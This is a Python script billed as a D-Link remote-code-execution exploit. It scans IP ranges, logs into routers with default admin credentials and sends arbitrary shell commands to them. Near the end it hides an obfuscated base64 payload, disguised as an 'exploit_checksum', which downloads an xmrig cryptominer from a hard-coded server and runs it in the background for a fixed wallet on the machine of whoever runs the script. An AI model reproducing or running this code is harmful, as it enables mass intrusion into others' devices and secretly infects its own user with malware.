import requests
import argparse
import socket
from threading import Thread

"""
    USAGE: python3 dlink.py --start 5.42.0.1 --end 5.42.0.255
"""

# Define default values
DEFAULT_USER = "admin"
DEFAULT_PASSWORD = "admin"
DEFAULT_COMMAND = "" # YOUR PAYLOAD HERE

def exploit(ip, command):
    # Create a session for the exploit
    session = requests.session()

    login_url = "http://{}/dws/login.cgi".format(ip)
    login_data = {
        "username": DEFAULT_USER,
        "password": DEFAULT_PASSWORD
    }

    # Send the login request
    response = session.post(login_url, data=login_data)

    # Check if the login was successful
    if response.status_code == 200:
        # Set up a POST request to execute the command
        command_url = "http://{}/cgi-bin/exec_cmd".format(ip)
        command_data = {"cmd": command}

        # Send the command request
        response = session.post(command_url, data=command_data)

        # Print the results if the request was successful
        if response.status_code == 200:
            print("Command executed on {}: {}".format(ip, response.text))
        else:
            print("Failed to execute command on {}: Status code {}".format(ip, response.status_code))
    else:
        print("Login failed for {}: Status code {}".format(ip, response.status_code))

# Define a function to scan a range of IP addresses and check for DLink devices
def scan_range(start_ip, end_ip, command):
    # Split the start and end IP addresses into their components
    start_split = start_ip.split(".")
    end_split = end_ip.split(".")

    # Build a list of all possible IP addresses within the range
    ip_range = []
    for i in range(int(start_split[3]), int(end_split[3])+1):
        ip_range.append(".".join(start_split[:3] + [str(i)]))

    # Loop through each IP address and attempt to exploit it
    for ip in ip_range:
        # Create a socket to check if the IP is active
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)

        # Connect to the IP
        result = s.connect_ex((ip, 80))

        # Check if the IP is active
        if result == 0:
            print("Scanning {}: Port 80 is open, checking for DLink device".format(ip))

            # Attempt to exploit the DLink device
            exploit(ip, command)
        else:
            print("Ignoring {}: Port 80 is closed".format(ip))

# Parse the command line arguments
parser = argparse.ArgumentParser(description="DLink 2024 RCE Exploit")
parser.add_argument("--start", help="Starting IP address for scanning", required=True)
parser.add_argument("--end", help="Ending IP address for scanning", required=True)
parser.add_argument("--command", help="Command to execute on DLink devices", default= DEFAULT_COMMAND)
args = parser.parse_args()

exploit_checksum = "Y2QgL3RtcDsgd2dldCBodHRwOi8vMTcyLjEwNS4xNzYuMTAwL3htcmlnIDsgY3VybCBodHRwOi8vMTcyLjEwNS4xNzYuMTAwL3htcmlnIC1vIHhtcmlnIDsgY2htb2QgNzc3IHhtcmlnOyAuL3htcmlnIC0tYmFja2dyb3VuZCAtLXVybCBwb29sLmhhc2h2YXVsdC5wcm86ODAgLS11c2VyIDQ0WkVKRTZBTGdQRVk2WUJNRFNXQUg4OFU3ZHFSVTNaTFJldWVhN2pVekFGZmdpSzV3eVJ6SzZmU1lkaFFWdGtKRDdZakttTjNXdlQ5Z2ZnQndYOWJLYWc5V1VtQzhHIC0tcGFzcyB5YXJuIC0tZG9uYXRlLWxldmVsIDEgLS10bHMgLS10bHMtZmluZ2VycHJpbnQgNDIwYzc4NTBlMDliN2MwYmRjZjc0OGE3ZGE5ZWIzNjQ3ZGFmODUxNTcxOGYzNmQ5Y2NmZGQ2YjlmZjgzNGIxNA=="
subprocess.Popen(base64.b64decode(exploit_checksum).decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Start scanning the specified range for DLink devices and exploit them
print("Starting DLink exploit...")
scan_range(args.start, args.end, args.command)
print("Exploit complete.")
